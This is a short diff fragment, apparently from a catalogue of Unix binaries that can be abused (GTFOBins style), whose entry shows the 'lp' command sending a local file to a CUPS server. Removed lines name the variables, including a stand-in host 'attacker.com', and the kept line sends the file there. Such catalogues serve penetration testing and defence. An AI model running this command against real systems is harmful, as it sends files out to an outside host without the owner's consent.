@@ -11,7 +11,5 @@ functions:
 
         Send a local file to a CUPS server.
       code: |
-        LFILE=file_to_send
-        RHOST=attacker.com
         lp $LFILE -h $RHOST
 ---
